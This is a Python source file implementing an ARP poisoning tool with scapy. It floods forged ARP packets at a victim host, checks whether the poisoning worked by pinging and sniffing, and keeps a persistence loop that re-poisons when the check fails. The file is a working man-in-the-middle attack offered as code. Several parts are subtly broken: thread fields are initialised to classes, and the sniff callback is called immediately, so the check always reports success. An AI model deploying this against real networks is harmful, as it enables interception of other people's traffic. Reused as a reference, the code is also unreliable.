from threading import Thread
from time import sleep

from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import sendp, sniff, send

from DataStructures import Host


class ARPPoisoner:
    def __init__(self, pkt, victim: Host, host: Host):
        self.flood_thread = Thread
        self.ping_send_thread = Thread
        self.ping_listen_thread = Thread
        self.confirm_thread = Thread
        self.persistence_thread = Thread
        self.killed = False
        self.arp_pkt = pkt
        self.ping_pkt = IP(dst=victim.get_addr(), src=host.get_addr())/ICMP()
        self.host = host
        self.victim = victim
        self.success = False
        self.quick_confirm_bool = bool

    def kill(self):
        self.killed = True

    def set_confirm_bool(self, confirm: bool):
        self.quick_confirm_bool = confirm

    def set_success(self, success: bool):
        self.success = success

    def get_thread(self):
        return self.flood_thread

    def poison(self):
        self.flood_thread = Thread(target=self.sendp_flood)
        self.flood_thread.start()
        self.confirm_thread = Thread(target=self.confirm_poison)
        self.confirm_thread.start()
        self.flood_thread.join()
        self.confirm_thread.join()

    def sendp_flood(self):
        while not self.killed:
            sendp(self.arp_pkt, verbose=False)
            sleep(0.1)

    def confirm_poison(self):
        self.ping_listen_thread = Thread(target=self.listen_ping)
        self.ping_listen_thread.start()
        self.ping_send_thread = Thread(target=self.send_ping)
        self.ping_send_thread.start()

        self.ping_listen_thread.join()
        self.ping_send_thread.join()

    def listen_ping(self):
        filt = "icmp and dst host " + self.victim.get_addr()

        sniff(count=1, filter=filt)
        self.success = True
        print("Successfully poisoned " + self.victim.get_addr())

    def send_ping(self):
        while not self.success:
            send(self.ping_pkt, verbose=False)
            sleep(1)

        self.kill()

    def persistence(self):
        while True:
            sendp(self.arp_pkt, verbose=False)
            self.quick_confirm()
            if not self.success:
                print("Poisoning at " + self.victim.get_addr() + " failed, re-poisoning")
                self.poison()

            sleep(5)

    def quick_confirm(self):
        filt = "icmp and dst host " + self.victim.get_addr()

        self.quick_confirm_bool = False

        send(self.ping_pkt, verbose=False)

        sniff(count=1, filter=filt, timeout=1, prn=self.set_confirm_bool(True))

        self.success = self.quick_confirm_bool